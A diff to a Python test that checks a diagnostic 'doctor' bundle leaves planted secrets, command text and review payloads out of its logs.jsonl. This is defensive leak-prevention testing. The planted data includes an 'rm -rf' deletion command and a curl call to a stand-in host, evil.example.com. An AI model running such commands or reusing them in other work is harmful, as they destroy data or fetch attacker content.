@@ -19,6 +19,18 @@ SECRETS = [
     "private-key-SECRET-XYZ",
 ]
 
+# Planted command text and review payloads. These must NOT appear in
+# logs.jsonl — the bundle must exclude command text, not just credentials.
+PLANTED_COMMANDS = [
+    "rm -rf /tmp/planted-command-ABC123",
+    "curl https://evil.example.com/planted-payload-XYZ789",
+]
+
+PLANTED_REVIEW_PAYLOADS = [
+    "planted-review-payload-DEF456",
+    "sensitive-tool-arg-planted-GHI789",
+]
+
 
 def doctor_bundle(case):
     home = case.home
@@ -53,6 +65,21 @@ def doctor_bundle(case):
             "msg": "pairing completed",
             "pairing_code": SECRETS[1],
         }) + "\n")
+        # Plant command text and review payloads — these must be excluded
+        # from the bundle's logs.jsonl, not just redacted.
+        for cmd in PLANTED_COMMANDS:
+            f.write(json.dumps({
+                "level": "info",
+                "msg": "tool executed",
+                "command": cmd,
+            }) + "\n")
+        for payload in PLANTED_REVIEW_PAYLOADS:
+            f.write(json.dumps({
+                "level": "info",
+                "msg": "review recorded",
+                "payload": payload,
+                "tool_args": payload,
+            }) + "\n")
 
     # Build the bundle.
     bundle_path = home.path("bundle.tar.gz")
@@ -80,6 +107,30 @@ def doctor_bundle(case):
         "no secrets in bundle",
         not found,
         f"secrets leaked: {found}" if found else "",
+    )
+
+    # Planted command text and review payloads must NOT appear in logs.jsonl.
+    # This proves the bundle excludes command text, not merely credentials.
+    logs_path = os.path.join(extract_dir, "logs.jsonl")
+    with open(logs_path, "rb") as fh:
+        logs_data = fh.read()
+    cmd_found = []
+    for cmd in PLANTED_COMMANDS:
+        if cmd.encode() in logs_data:
+            cmd_found.append(cmd)
+    case.check(
+        "no planted command text in logs.jsonl",
+        not cmd_found,
+        f"commands leaked: {cmd_found}" if cmd_found else "",
+    )
+    payload_found = []
+    for payload in PLANTED_REVIEW_PAYLOADS:
+        if payload.encode() in logs_data:
+            payload_found.append(payload)
+    case.check(
+        "no planted review payloads in logs.jsonl",
+        not payload_found,
+        f"payloads leaked: {payload_found}" if payload_found else "",
     )
 
     # The bundle must still contain the expected files.
